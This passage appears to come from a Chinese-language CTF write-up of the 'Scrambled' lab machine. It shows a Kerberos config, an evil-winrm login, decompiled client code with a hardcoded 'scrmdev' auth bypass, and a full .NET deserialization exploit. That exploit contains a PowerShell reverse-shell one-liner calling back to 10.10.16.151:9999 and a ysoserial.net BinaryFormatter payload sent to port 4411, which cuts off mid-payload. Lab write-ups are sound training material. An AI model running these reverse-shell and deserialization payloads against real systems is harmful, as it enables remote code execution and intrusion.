+</span></span><span style=display:flex><span>                kdc <span style=color:#f92672>=</span> kerberos1.utoronto.ca
+</span></span><span style=display:flex><span>                kdc <span style=color:#f92672>=</span> kerberos2.utoronto.ca
+</span></span><span style=display:flex><span>                kdc <span style=color:#f92672>=</span> kerberos3.utoronto.ca
+</span></span><span style=display:flex><span>                admin_server <span style=color:#f92672>=</span> kerberos1.utoronto.ca
+</span></span><span style=display:flex><span>                default_domain <span style=color:#f92672>=</span> utoronto.ca
+</span></span><span style=display:flex><span>	<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>     	 SCRM.LOCAL <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>       		kdc <span style=color:#f92672>=</span> DC1.scrm.local
+</span></span><span style=display:flex><span>	        admin_server <span style=color:#f92672>=</span> DC1.scrm.local
+</span></span><span style=display:flex><span>    	<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>domain_realm<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>	.mit.edu <span style=color:#f92672>=</span> ATHENA.MIT.EDU
+</span></span><span style=display:flex><span>	mit.edu <span style=color:#f92672>=</span> ATHENA.MIT.EDU
+</span></span><span style=display:flex><span>	.media.mit.edu <span style=color:#f92672>=</span> MEDIA-LAB.MIT.EDU
+</span></span><span style=display:flex><span>	media.mit.edu <span style=color:#f92672>=</span> MEDIA-LAB.MIT.EDU
+</span></span><span style=display:flex><span>	.csail.mit.edu <span style=color:#f92672>=</span> CSAIL.MIT.EDU
+</span></span><span style=display:flex><span>	csail.mit.edu <span style=color:#f92672>=</span> CSAIL.MIT.EDU
+</span></span><span style=display:flex><span>	.whoi.edu <span style=color:#f92672>=</span> ATHENA.MIT.EDU
+</span></span><span style=display:flex><span>	whoi.edu <span style=color:#f92672>=</span> ATHENA.MIT.EDU
+</span></span><span style=display:flex><span>	.stanford.edu <span style=color:#f92672>=</span> stanford.edu
+</span></span><span style=display:flex><span>	.slac.stanford.edu <span style=color:#f92672>=</span> SLAC.STANFORD.EDU
+</span></span><span style=display:flex><span>        .toronto.edu <span style=color:#f92672>=</span> UTORONTO.CA
+</span></span><span style=display:flex><span>        .utoronto.ca <span style=color:#f92672>=</span> UTORONTO.CA
+</span></span><span style=display:flex><span>	.scrm.local <span style=color:#f92672>=</span> SCRM.LOCAL
+</span></span><span style=display:flex><span>     	scrm.local <span style=color:#f92672>=</span> SCRM.LOCAL
+</span></span></code></pre></div><p>登录 Miscsvc 拿到 user.txt。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ evil-winrm -i DC1.scrm.local -r scrm.local -u Miscsvc -p <span style=color:#e6db74>&#39;ScrambledEggs9900&#39;</span>
+</span></span><span style=display:flex><span>                                        
+</span></span><span style=display:flex><span>Evil-WinRM shell v3.9
+</span></span><span style=display:flex><span>                                        
+</span></span><span style=display:flex><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style=color:#e6db74>`</span>quoting_detection_proc<span style=color:#960050;background-color:#1e0010>&#39;</span> <span style=color:#66d9ef>for</span> module Reline
+</span></span><span style=display:flex><span>                                        
+</span></span><span style=display:flex><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style=display:flex><span>                                        
+</span></span><span style=display:flex><span>Warning: User is not needed <span style=color:#66d9ef>for</span> Kerberos auth. Ticket will be used
+</span></span><span style=display:flex><span>                                        
+</span></span><span style=display:flex><span>Warning: Password is not needed <span style=color:#66d9ef>for</span> Kerberos auth. Ticket will be used
+</span></span><span style=display:flex><span>                                        
+</span></span><span style=display:flex><span>Info: Establishing connection to remote endpoint
+</span></span><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\m</span>iscsvc<span style=color:#ae81ff>\D</span>ocuments&gt; cd ..<span style=color:#ae81ff>\D</span>esktop
+</span></span><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\m</span>iscsvc<span style=color:#ae81ff>\D</span>esktop&gt; type user.txt
+</span></span><span style=display:flex><span>5bc7567aa31b244d213e4106dace79a4
+</span></span></code></pre></div><h2 id=windows-提权>Windows 提权</h2><p>Shell 里翻到了之前 SMB 上进不去的 IT 共享对应的本地目录 <code>C:\Shares\IT\Apps</code>，<code>Sales Order Client</code> 客户端和它的库 <code>ScrambleLib.dll</code> 在里面 —— 正好对上 4411 端口那个自定义协议。把两个文件拖回本地做逆向。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\S</span>hares<span style=color:#ae81ff>\I</span>T<span style=color:#ae81ff>\A</span>pps&gt; cd <span style=color:#e6db74>&#39;Sales Order Client&#39;</span>
+</span></span><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\S</span>hares<span style=color:#ae81ff>\I</span>T<span style=color:#ae81ff>\A</span>pps<span style=color:#ae81ff>\S</span>ales Order Client&gt; dir
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Directory: C:<span style=color:#ae81ff>\S</span>hares<span style=color:#ae81ff>\I</span>T<span style=color:#ae81ff>\A</span>pps<span style=color:#ae81ff>\S</span>ales Order Client
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name
+</span></span><span style=display:flex><span>----                -------------         ------ ----
+</span></span><span style=display:flex><span>-a----        11/5/2021   8:52 PM          <span style=color:#ae81ff>86528</span> ScrambleClient.exe
+</span></span><span style=display:flex><span>-a----        11/5/2021   8:52 PM          <span style=color:#ae81ff>19456</span> ScrambleLib.dll
+</span></span></code></pre></div><p>下载到 kali。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\S</span>hares<span style=color:#ae81ff>\I</span>T<span style=color:#ae81ff>\A</span>pps<span style=color:#ae81ff>\S</span>ales Order Client&gt; dir
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Directory: C:<span style=color:#ae81ff>\S</span>hares<span style=color:#ae81ff>\I</span>T<span style=color:#ae81ff>\A</span>pps<span style=color:#ae81ff>\S</span>ales Order Client
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name
+</span></span><span style=display:flex><span>----                -------------         ------ ----
+</span></span><span style=display:flex><span>-a----        11/5/2021   8:52 PM          <span style=color:#ae81ff>86528</span> ScrambleClient.exe
+</span></span><span style=display:flex><span>-a----        11/5/2021   8:52 PM          <span style=color:#ae81ff>19456</span> ScrambleLib.dll
+</span></span><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\S</span>hares<span style=color:#ae81ff>\I</span>T<span style=color:#ae81ff>\A</span>pps<span style=color:#ae81ff>\S</span>ales Order Client&gt; download ScrambleClient.exe
+</span></span><span style=display:flex><span>                                        
+</span></span><span style=display:flex><span>Info: Downloading C:<span style=color:#ae81ff>\S</span>hares<span style=color:#ae81ff>\I</span>T<span style=color:#ae81ff>\A</span>pps<span style=color:#ae81ff>\S</span>ales Order Client<span style=color:#ae81ff>\S</span>crambleClient.exe to ScrambleClient.exe
+</span></span><span style=display:flex><span>                                        
+</span></span><span style=display:flex><span>Info: Download successful!
+</span></span><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\S</span>hares<span style=color:#ae81ff>\I</span>T<span style=color:#ae81ff>\A</span>pps<span style=color:#ae81ff>\S</span>ales Order Client&gt; download ScrambleLib.dll
+</span></span><span style=display:flex><span>                                        
+</span></span><span style=display:flex><span>Info: Downloading C:<span style=color:#ae81ff>\S</span>hares<span style=color:#ae81ff>\I</span>T<span style=color:#ae81ff>\A</span>pps<span style=color:#ae81ff>\S</span>ales Order Client<span style=color:#ae81ff>\S</span>crambleLib.dll to ScrambleLib.dll
+</span></span><span style=display:flex><span>                                        
+</span></span><span style=display:flex><span>Info: Download successful!
+</span></span></code></pre></div><p>将两个文件拿到 Windows 环境，用 dnspy 逆向。</p><p><code>Logon()</code> 里藏着个明显的后门：用户名忽略大小写等于 <code>scrmdev</code> 时直接放行，连密码都不校验（日志都会记一句 <code>Developer logon bypass used</code>）。其余用户则把 <code>Username|Password</code> 拼起来发给 4411 服务端做认证 —— 也就是说客户端和服务端之间传的是序列化对象。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>		public bool Logon<span style=color:#f92672>(</span>string Username, string Password<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>		<span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>			bool flag;
+</span></span><span style=display:flex><span>			try
+</span></span><span style=display:flex><span>			<span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>string.Compare<span style=color:#f92672>(</span>Username, <span style=color:#e6db74>&#34;scrmdev&#34;</span>, true<span style=color:#f92672>)</span> <span style=color:#f92672>==</span> 0<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>				<span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>					Log.Write<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Developer logon bypass used&#34;</span><span style=color:#f92672>)</span>;
+</span></span><span style=display:flex><span>					flag <span style=color:#f92672>=</span> true;
+</span></span><span style=display:flex><span>				<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>				<span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>				<span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>					HashAlgorithm hashAlgorithm <span style=color:#f92672>=</span> MD5.Create<span style=color:#f92672>()</span>;
+</span></span><span style=display:flex><span>					byte<span style=color:#f92672>[]</span> bytes <span style=color:#f92672>=</span> Encoding.ASCII.GetBytes<span style=color:#f92672>(</span>Password<span style=color:#f92672>)</span>;
+</span></span><span style=display:flex><span>					Convert.ToBase64String<span style=color:#f92672>(</span>hashAlgorithm.ComputeHash<span style=color:#f92672>(</span>bytes, 0, bytes.Length<span style=color:#f92672>))</span>;
+</span></span><span style=display:flex><span>					ScrambleNetResponse scrambleNetResponse <span style=color:#f92672>=</span> this.SendRequestAndGetResponse<span style=color:#f92672>(</span>new ScrambleNetRequest<span style=color:#f92672>(</span>ScrambleNetRequest.RequestType.AuthenticationRequest, Username + <span style=color:#e6db74>&#34;|&#34;</span> + Password<span style=color:#f92672>))</span>;
+</span></span><span style=display:flex><span>					ScrambleNetResponse.ResponseType type <span style=color:#f92672>=</span> scrambleNetResponse.Type;
+</span></span><span style=display:flex><span>					<span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>type !<span style=color:#f92672>=</span> ScrambleNetResponse.ResponseType.Success<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>					<span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>						<span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>type !<span style=color:#f92672>=</span> ScrambleNetResponse.ResponseType.InvalidCredentials<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>						<span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>							throw new ApplicationException<span style=color:#f92672>(</span>scrambleNetResponse.GetErrorDescription<span style=color:#f92672>())</span>;
+</span></span><span style=display:flex><span>						<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>						Log.Write<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Logon failed due to invalid credentials&#34;</span><span style=color:#f92672>)</span>;
+</span></span><span style=display:flex><span>						flag <span style=color:#f92672>=</span> false;
+</span></span><span style=display:flex><span>					<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>					<span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>					<span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>						Log.Write<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Logon successful&#34;</span><span style=color:#f92672>)</span>;
+</span></span><span style=display:flex><span>						flag <span style=color:#f92672>=</span> true;
+</span></span><span style=display:flex><span>					<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>				<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>			<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>			catch <span style=color:#f92672>(</span>Exception ex<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>			<span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>				Log.Write<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Error: &#34;</span> + ex.Message<span style=color:#f92672>)</span>;
+</span></span><span style=display:flex><span>				throw ex;
+</span></span><span style=display:flex><span>			<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> flag;
+</span></span><span style=display:flex><span>		<span style=color:#f92672>}</span>
+</span></span></code></pre></div><p>打开 ScrambleClient.exe，按之前发现的配置进行配置。</p><p><img src=Pasted%20image%2020260907171126.png alt></p><p>Windows 添加靶机进 hosts 文件，连接成功。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32 &gt; Set-ItemProperty C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\d</span>rivers<span style=color:#ae81ff>\e</span>tc<span style=color:#ae81ff>\h</span>osts -Name IsReadOnly -Value $false
+</span></span><span style=display:flex><span>Commando VM 09/09/2026 14:03:44
+</span></span><span style=display:flex><span>PS C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32 &gt; Add-Content C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\d</span>rivers<span style=color:#ae81ff>\e</span>tc<span style=color:#ae81ff>\h</span>osts -Value <span style=color:#e6db74>&#34;10.129.36.208 dc1.scrm.local&#34;</span>
+</span></span><span style=display:flex><span>Commando VM 09/09/2026 14:04:23
+</span></span><span style=display:flex><span>PS C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32 &gt; Ping dc1.scrm.local
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>正在 Ping dc1.scrm.local <span style=color:#f92672>[</span>10.129.36.208<span style=color:#f92672>]</span> 具有 <span style=color:#ae81ff>32</span> 字节的数据:
+</span></span><span style=display:flex><span>来自 10.129.36.208 的回复: 字节<span style=color:#f92672>=</span><span style=color:#ae81ff>32</span> 时间<span style=color:#f92672>=</span>106ms TTL<span style=color:#f92672>=</span><span style=color:#ae81ff>127</span>
+</span></span><span style=display:flex><span>来自 10.129.36.208 的回复: 字节<span style=color:#f92672>=</span><span style=color:#ae81ff>32</span> 时间<span style=color:#f92672>=</span>106ms TTL<span style=color:#f92672>=</span><span style=color:#ae81ff>127</span>
+</span></span><span style=display:flex><span>来自 10.129.36.208 的回复: 字节<span style=color:#f92672>=</span><span style=color:#ae81ff>32</span> 时间<span style=color:#f92672>=</span>105ms TTL<span style=color:#f92672>=</span><span style=color:#ae81ff>127</span>
+</span></span><span style=display:flex><span>来自 10.129.36.208 的回复: 字节<span style=color:#f92672>=</span><span style=color:#ae81ff>32</span> 时间<span style=color:#f92672>=</span>105ms TTL<span style=color:#f92672>=</span><span style=color:#ae81ff>127</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>10.129.36.208 的 Ping 统计信息:
+</span></span><span style=display:flex><span>    数据包: 已发送 <span style=color:#f92672>=</span> 4，已接收 <span style=color:#f92672>=</span> 4，丢失 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>(</span>0% 丢失<span style=color:#f92672>)</span>，
+</span></span><span style=display:flex><span>往返行程的估计时间<span style=color:#f92672>(</span>以毫秒为单位<span style=color:#f92672>)</span>:
+</span></span><span style=display:flex><span>    最短 <span style=color:#f92672>=</span> 105ms，最长 <span style=color:#f92672>=</span> 106ms，平均 <span style=color:#f92672>=</span> 105ms
+</span></span></code></pre></div><p>登录 scrmdev。</p><p><img src=Pasted%20image%2020260909140538.png alt></p><p><img src=Pasted%20image%2020260909140555.png alt></p><p>准备 payload：<code>$one</code> 是一个 TCPClient 反弹 shell，回连 <code>10.10.16.151:9999</code>；转 UTF-16LE 再 base64，作为 <code>powershell -enc</code> 的参数。然后用 ysoserial.net 生成 <strong>BinaryFormatter</strong> 反序列化 payload，gadget 选 <code>WindowsIdentity</code>，输出 base64 —— 服务端拿到客户端传来的对象直接 <code>BinaryFormatter.Deserialize()</code>，反序列化瞬间就会执行我们塞进去的命令。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\C</span>henling<span style=color:#ae81ff>\D</span>esktop<span style=color:#ae81ff>\T</span>ools<span style=color:#ae81ff>\y</span>soserial.net<span style=color:#ae81ff>\R</span>elease &gt; $one <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;$c=New-Object System.Net.Sockets.TCPClient(&#34;10.10.16.151&#34;,9999);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2&gt;&amp;1|Out-String)+&#34;PS&gt; &#34;;$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()&#39;</span>
+</span></span><span style=display:flex><span>Commando VM 09/09/2026 15:25:02
+</span></span><span style=display:flex><span>PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\C</span>henling<span style=color:#ae81ff>\D</span>esktop<span style=color:#ae81ff>\T</span>ools<span style=color:#ae81ff>\N</span>etworking &gt; $enc <span style=color:#f92672>=</span> <span style=color:#f92672>[</span>Convert<span style=color:#f92672>]</span>::ToBase64String<span style=color:#f92672>([</span>Text.Encoding<span style=color:#f92672>]</span>::Unicode.GetBytes<span style=color:#f92672>(</span>$one<span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span>Commando VM 09/09/2026 15:23:43
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\C</span>henling<span style=color:#ae81ff>\D</span>esktop<span style=color:#ae81ff>\T</span>ools<span style=color:#ae81ff>\y</span>soserial.net<span style=color:#ae81ff>\R</span>elease &gt; .<span style=color:#ae81ff>\y</span>soserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c <span style=color:#e6db74>&#34;powershell -nop -w hidden -enc </span>$enc<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA/BJBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBdmd3OFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUhCdmQyVnljMmhsYkd3Z0xXNXZjQ0F0ZHlCb2FXUmtaVzRnTFdWdVl5QktRVUpxUVVRd1FWUm5RbXhCU0dOQlRGRkNVRUZIU1VGaFowSnNRVWROUVdSQlFXZEJSazFCWlZGQ2VrRklVVUZhVVVKMFFVTTBRVlJuUW14QlNGRkJUR2RDVkVGSE9FRlpkMEp5UVVkVlFXUkJRbnBCUXpSQlZrRkNSRUZHUVVGUmQwSnpRVWRyUVZwUlFuVkJTRkZCUzBGQmFVRkVSVUZOUVVGMVFVUkZRVTFCUVhWQlJFVkJUbWRCZFVGRVJVRk9VVUY0UVVOSlFVeEJRVFZCUkd0QlQxRkJOVUZEYTBGUGQwRnJRVWhOUVZCUlFXdEJSMDFCVEdkQ1NFRkhWVUZrUVVKVVFVaFJRV05uUW14QlIwVkJZbEZCYjBGRGEwRlBkMEppUVVkSlFXVlJRakJCUjFWQlYzZENaRUZHTUVGS1FVSnBRVVF3UVUxQlFYVkJRelJCVG1kQk1VRkVWVUZOZDBFeFFVaDNRVXBSUWpkQlJFRkJabEZCTjBGSVkwRmhRVUp3UVVkM1FWcFJRVzlCUTJkQlNrRkNjRUZFTUVGS1FVSjZRVU0wUVZWblFteEJSMFZCV2tGQmIwRkRVVUZaWjBGelFVUkJRVXhCUVd0QlIwbEJUR2RDVFVGSFZVRmlaMEp1UVVoUlFXRkJRWEJCUTJ0QlNVRkJkRUZITkVGYVVVRm5RVVJCUVV0UlFqZEJRMUZCV2tGQk9VRkRaMEZVWjBKc1FVaGpRVXhSUWxCQlIwbEJZV2RDYkVGSFRVRmtRVUZuUVVaUlFWcFJRalJCU0ZGQlRHZENRa0ZHVFVGUmQwSktRVVZyUVZKUlFuVkJSMDFCWW5kQ2EwRkhhMEZpWjBKdVFVTnJRVXhuUWtoQlIxVkJaRUZDVkVGSVVVRmpaMEp3UVVjMFFWcDNRVzlCUTFGQldXZEJjMEZFUVVGTVFVRnJRVWRyUVV0UlFUZEJRMUZCWTJkQk9VRkRaMEZoVVVKc1FVaG5RVWxCUVd0QlIxRkJTVUZCZVVGRU5FRktaMEY0UVVoM1FWUjNRakZCU0ZGQlRGRkNWRUZJVVVGalowSndRVWMwUVZwM1FYQkJRM05CU1dkQ1VVRkdUVUZRWjBGblFVTkpRVTkzUVd0QlNFMUJXV2RCT1VGRFowRlhkMEpWUVVkVlFXVkJRakJCUXpSQlVsRkNkVUZIVFVGaWQwSnJRVWRyUVdKblFtNUJSakJCVDJkQk5rRkZSVUZWZDBKRVFVVnJRVk5SUVhCQlF6UkJVbmRDYkVGSVVVRlJaMEkxUVVoUlFWcFJRbnBCUTJkQlNrRkNlVUZEYTBGUGQwRnJRVWhOUVV4blFsaEJTRWxCWVZGQ01FRkhWVUZMUVVGclFVaE5RVmxuUVhOQlJFRkJURUZCYTBGSVRVRlpaMEYxUVVWM1FWcFJRblZCUjJOQlpFRkNiMEZEYTBGUGQwRnJRVWhOUVV4blFrZEJSM2RCWkZGQ2VrRkhaMEZMUVVGd1FVZ3dRVTkzUVd0QlIwMUJUR2RDUkVGSGQwRmlkMEo2UVVkVlFVdEJRWEJCUVQwOUlpQlRkR0Z1WkdGeVpFVnljbTl5Ulc1amIyUnBibWM5SW50NE9rNTFiR3g5SWlCVGRHRnVaR0Z5WkU5MWRIQjFkRVZ1WTI5a2FXNW5QU0o3ZURwT2RXeHNmU0lnVlhObGNrNWhiV1U5SWlJZ1VHRnpjM2R2Y21ROUludDRPazUxYkd4OUlpQkViMjFoYVc0OUlpSWdURzloWkZWelpYSlFjbTltYVd4bFBTSkdZV3h6WlNJZ1JtbHNaVTVoYldVOUltTnRaQ0lnTHo0TkNpQWdJQ0FnSUR3dmMyUTZVSEp2WTJWemN5NVRkR0Z5ZEVsdVptOCtEUW9nSUNBZ1BDOXpaRHBRY205alpYTnpQZzBLSUNBOEwwOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNpNVBZbXBsWTNSSmJuTjBZVzVqWlQ0TkNqd3ZUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlQZ3M9Cw<span style=color:#f92672>==</span>
+</span></span><span style=display:flex><span>Commando VM 09/10/2026 10:36:52
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\C</span>henling<span style=color:#ae81ff>\D</span>esktop<span style=color:#ae81ff>\T</span>ools<span style=color:#ae81ff>\N</span>etworking &gt; .<span style=color:#ae81ff>\n</span>c64.exe dc1.scrm.local <span style=color:#ae81ff>4411</span>
+</span></span><span style=display:flex><span>SCRAMBLECORP_ORDERS_V1.0.3;
+</span></span><span style=display:flex><span>UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA/BJBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBdmd3OFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU